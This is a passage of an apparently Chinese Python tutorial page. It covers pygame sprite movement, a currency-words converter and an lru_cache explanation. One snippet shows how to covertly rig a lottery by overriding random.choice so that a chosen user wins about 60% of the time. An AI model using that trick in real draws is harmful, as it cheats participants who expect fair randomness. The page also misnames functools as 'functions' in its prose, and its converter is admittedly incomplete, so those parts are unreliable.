    sprite_pos += key_direction * sprite_speed * time_passed_seconds

    pygame.display.update()

</textarea>使鱼做到全方位移动。先转向,再移动<textarea>
import pygame
from pygame.locals import *
from sys import exit
from vector import Vec2d
from math import *

background_image = '../image/sushiplate.jpg'
sprite_image = '../image/fugu.png'

pygame.init()
screen = pygame.display.set_mode((640, 480), 0, 32)
background = pygame.image.load(background_image).convert()
sprite = pygame.image.load(sprite_image)
clock = pygame.time.Clock()
sprite_pos = Vec2d(200, 150)
sprite_speed = 300
sprite_rotation = 0
sprite_rotation_speed = 360

while True:
    for event in pygame.event.get():
        if event.type == QUIT: exit()
    pressed_keys = pygame.key.get_pressed()
    rotation_direction = 0
    movement_direction = 0

    # 更改角度
    if pressed_keys[K_LEFT]:
        rotation_direction = +1
    elif pressed_keys[K_RIGHT]:
        rotation_direction = -1
    # 前进、后退
    if pressed_keys[K_UP]:
        movement_direction = +1.
    if pressed_keys[K_DOWN]:
        movement_direction = -1.

    screen.blit(background, (0, 0))
    # 将鱼转向
    rotated_sprite = pygame.transform.rotate(sprite, sprite_rotation)
    # 转向后,图片的长宽会变化,因为图片永远是矩形,为了放得下一个转向后的矩形,外接的矩形势必会比较大
    w, h = rotated_sprite.get_size()
    sprite_draw_pos = Vec2d(sprite_pos.x - w / 2, sprite_pos.y - h / 2)
    screen.blit(rotated_sprite, sprite_draw_pos)

    time_passed = clock.tick(30)
    time_passed_seconds = time_passed/1000

    # 图片的转向速度也通过时间来控制
    sprite_rotation += rotation_direction * sprite_rotation_speed * time_passed_seconds

    # 获得前进(x方向和y方向)
    heading_x = sin(sprite_rotation * pi / 180)
    heading_y = cos(sprite_rotation * pi / 180)
    # 转换为单位速度向量
    heading = Vec2d(heading_x, heading_y)
    # 转换为速度
    heading *= movement_direction
    sprite_pos += heading * sprite_speed * time_passed_seconds

    pygame.display.update()

</textarea><pre>
鼠标控制
可以从MOUSEMOTION和pygame.mouse.get_pos()获得鼠标坐标。可以使用这个坐标来控制方向,如使用鼠标的偏移量来控制视角

</pre>使用鼠标左右移动来转动鱼<textarea>
import pygame
from pygame.locals import *
from sys import exit
from vector import Vec2d
from math import *

background_image = '../image/sushiplate.jpg'
sprite_image = '../image/fugu.png'

pygame.init()
screen = pygame.display.set_mode((640, 480), 0, 32)
background = pygame.image.load(background_image).convert()
sprite = pygame.image.load(sprite_image)
clock = pygame.time.Clock()

pygame.mouse.set_visible(False)
# 使所有的输入都锁定在这个程序中
pygame.event.set_grab(True)

sprite_pos = Vec2d(200, 150)
sprite_speed = 300
sprite_rotation = 0
sprite_rotation_speed = 360

while True:
    for event in pygame.event.get():
        if event.type == QUIT: exit()
        # 按Esc,退出游戏
        if event.type == KEYDOWN:
            if event.key == K_ESCAPE: exit()

    pressed_keys = pygame.key.get_pressed()
    pressed_mouse = pygame.mouse.get_pressed()

    rotation_direction = 0
    movement_direction = 0
    # 得到鼠标的偏移量(x, y)
    rotation_direction = pygame.mouse.get_rel()[0]/5

    if pressed_keys[K_LEFT]:
        rotation_direction = -1
    elif pressed_keys[K_RIGHT]:
        rotation_direction = +1
    if pressed_keys[K_UP] or pressed_mouse[0]:
        movement_direction = -1
    if pressed_keys[K_DOWN] or pressed_mouse[2]:
        movement_direction = +1

    screen.blit(background, (0, 0))
    rotated_sprite = pygame.transform.rotate(sprite, sprite_rotation)
    w, h = rotated_sprite.get_size()
    sprite_draw_pos = Vec2d(sprite_pos.x - w / 2, sprite_pos.y - h / 2)
    screen.blit(rotated_sprite, sprite_draw_pos)

    time_passed = clock.tick(30)
    time_passed_seconds = time_passed/1000

    sprite_rotation += rotation_direction * sprite_rotation_speed * time_passed_seconds

    heading_x = sin(sprite_rotation * pi / 180)
    heading_y = cos(sprite_rotation * pi / 180)
    heading = Vec2d(heading_x, heading_y)
    heading *= movement_direction

    sprite_pos += heading * sprite_speed * time_passed_seconds

    pygame.display.update()

</textarea><pre>
pygame.mouse的函数：
pygame.mouse.get_pressed —— 返回按键按下情况,返回的是一元组,分别为(左键, 中键, 右键),如按下则为True
pygame.mouse.get_rel —— 返回相对偏移量,(x方向, y方向)的一元组
pygame.mouse.get_pos —— 返回当前鼠标位置(x, y)
pygame.mouse.set_pos —— 设置鼠标位置
pygame.mouse.set_visible —— 设置鼠标光标是否可见
pygame.mouse.get_focused —— 检查窗口是否接受鼠标事件,即鼠标是否focus到窗口
pygame.mouse.set_cursor —— 设置鼠标光标式样
pyGame.mouse.get_cursor ——得到鼠标图片

</pre>
</div>

<div id="demo">
<h3>demo 一日之技</h3>
实现在实际开发中常用的一个工具函数:将一个浮点数转换成人民币读法的字符串,这个程序需要使用数组<textarea>
"""
思路:
首先把这个浮点数分成整数部分和小数部分。提取整数部分很容易,直接将这个浮点数强制类型转换成一个整数即可,这个整数就是浮点数的整数部分;再使用浮点数减去整数就可以得到这个浮点数的小数部分。

然后分开处理整数部分和小数部分。小数部分的处理比较简单,直接截断保留2位数字,转换成几角几分的字符串。整数部分的处理则稍微复杂一点,但只要认真分析不难发现,中国的数字习惯是4位一节的,一个4位的数字可被转成几千几百几十几,至于后面添加什么单位则不确定:
如果这节4位数字出现在1~4位,则后面添加单位"元";
如果这节4位数字出现在5~8位,则后面添加单位"万";
如果这节4位数字出现在9~12位,则后面添加单位"亿";
多于12位就暂不考虑了。

因此实现这个程序的关键就是把一个4位的数字字符串转换成中文读法
对零的处理比较复杂,例如有两个零连在一起时该如何处理呢？还有小数部分如何翻译？因此这个程序还需要继续完善
"""

'''
把一个浮点数分解成整数部分和小数部分字符串
num 需要被分解的浮点数
返回分解出来的整数部分和小数部分。
第一个数组元素是整数部分,第二个数组元素是小数部分
'''
def divide(num):
    integer = int(num)                        # 将一个浮点数强制类型转换为int型,即得到它的整数部分
    fraction = round((num - integer) * 100)   # 浮点数减去整数部分得到小数部分,小数部分乘以100后再取整得到2位小数
    return (str(integer), str(fraction))      # 把整数转换为字符串

han_list = ["零" , "壹" , "贰" , "叁" , "肆" , "伍" , "陆" , "柒" , "捌" , "玖"]
unit_list = ["十" , "百" , "千"]

'''
把一个四位的数字字符串变成汉字字符串
num_str 需要被转换的四位的数字字符串
返回四位的数字字符串被转换成汉字字符串
'''
def four_to_hanstr(num_str):
    result = ""
    num_len = len(num_str)

    for i in range(num_len) :               # 依次遍历数字字符串的每一位数字
        num = int(num_str[i])               # 把字符串转成数值
        if i != num_len - 1 and num != 0 :  # 如果不是最后一位数字,而且数字不是零,则需要添加单位(千、百、十)
            result += han_list[num] + unit_list[num_len - 2 - i]
        else :                              # 否则不要添加单位
            result += han_list[num]
    return result

'''
把数字字符串变成汉字字符串
num_str 需要被转换的数字字符串
返回数字字符串被转换成汉字字符串
'''
def integer_to_str(num_str):
    str_len = len(num_str)
    if str_len > 12 :
        print('数字太大,翻译不了')
        return
    elif str_len > 8:   # 如果大于8位,包含单位亿
        return four_to_hanstr(num_str[:-8]) + "亿" + \
            four_to_hanstr(num_str[-8: -4]) + "万" + \
            four_to_hanstr(num_str[-4:])
    elif str_len > 4:   # 如果大于4位,包含单位万
        return four_to_hanstr(num_str[:-4]) + "万" + \
            four_to_hanstr(num_str[-4:])
    else:
        return four_to_hanstr(num_str)

num = float(input("请输入一个浮点数: "))
integer, fraction = divide(num)  # 测试把一个浮点数分解成整数部分和小数部分
print(integer_to_str(integer))   # 测试把一个四位的数字字符串变成汉字字符串
print(fraction)

# 测试
请输入一个浮点数: 361092004.456
叁亿陆千壹百零玖万贰千零零肆
46

</textarea>抽奖程序指定用户的中奖概率<textarea>
import random, time

people = ['kingname', '王小一', '李小二', '张小三', '刘小四', '卢小五', '马小六', '周小七', '丁小八', '朱小九']
for i in range(1, 11):
    lucky_guy = random.choice(people)
    print(f'第{i}次抽奖,中奖用户：{lucky_guy}')
    time.sleep(1)

# Python自带模块是可以被覆盖的,使用自定义函数choice可以覆盖random.choice,无论给random.choice传入什么参数都会返回kingname
def choice(option):
    return 'kingname'

import random
random.choice = choice

# Python的import在同一个运行时只会导入一次,Python的包导入机制决定了,在每个运行时内部每个包只有第一次导入的时候有效,所以只要还在当前运行时,那么后续的所有import random都是无效的。所以即使重新导入了random模块,random.choice依然是修改以后的代码。所以当再次执行的时候会发现返回的还是你想要的数据
import random
print(random.choice(['123', 'xyz']))  # kingname

# 如果备选列表里面不包含kingname,那么就使用原生的random.choice;如果备选列表里面包含kingname,那么就以60%的概率返回kingname
import random
origin_choice = random.choice

def choice(option):
    if 'kingname' not in option or random.randint(1, 10) > 6:
        return origin_choice(option)
    return 'kingname'

random.choice = choice

</textarea>functions模块提供的lru_cache装饰器实现函数调用结果的LRU缓存<textarea>
有一些函数调用耗时很长,但是又需要反复多次调用,并且每次调用时,相同的参数得到的结果都是相同的。在这种情况下,我们可能会使用变量或者列表来存放,例如：resp_1 = get_resp(param=1) resp_2 = get_resp(param=2) resp_3 = get_resp(param=3)
但如果返回的结果占用内存比较大,每次调用都把结果存在内存里面就会消耗大量内存。
可以使用LRU算法：最近最常使用的参数生成的结果存下来,下次遇到相同的参数时直接返回结果。而不常出现的参数等到需要的时候再计算。计算完成后也先存下来。但是如果缓存空间不够了,不常使用的会先删除。
LRU 的算法自己手动实现起来比较麻烦,但好在Python的functions模块已经提供了现成的lru_cache装饰器

lru_cache(maxsize=128,typed=False)接收两个参数,第一个参数maxsize表示最多缓存多少个结果,这个数字建议设置为2的幂。超出这个结果就会启用LRU算法删除不常用的数据。第二个参数typed表示是否检查参数类型,默认为False,如果设置为True,那么参数3和3.0会被当做不同的数据处理。
由于lru_cache底层是基于字典来实现的缓存,所以参数都必须是hashable的,否则会导致报错。

# 不带lru算法的程序
import time, datetime

def say(name):
    print(f'你好：{name}', end=" ")
    now = datetime.datetime.now()
    return now

now = say('kingname')
print(f'现在时间为：{now}')  # 你好：kingname 现在时间为：2019-10-24 00:56:03.026683
time.sleep(10)
now = say('产品经理')
print(f'现在时间为：{now}')  # 你好：产品经理 现在时间为：2019-10-24 00:56:13.027258
time.sleep(10)
now = say('kingname')
print(f'现在时间为：{now}')  # 你好：kingname 现在时间为：2019-10-24 00:56:23.027759

# 把LRU缓存加上,第三次调用say函数的时候传入的也是kingname,但是函数根本没有运行
import time, datetime
from functools import lru_cache

@lru_cache(maxsize=32)
def say(name):
    print(f'你好：{name}', end=" ")
    now = datetime.datetime.now()
    return now

now = say('kingname')
print(f'现在时间为：{now}')  # 你好：kingname 现在时间为：2019-10-24 00:58:10.092354
time.sleep(10)
now = say('产品经理')
print(f'现在时间为：{now}')  # 你好：产品经理 现在时间为：2019-10-24 00:58:20.093345
time.sleep(10)
now = say('kingname')
print(f'现在时间为：{now}')  # 现在时间为：2019-10-24 00:58:10.092354

</textarea>
</div>

</main>

<script src="vendors/public.js"></script>
</body>

</html>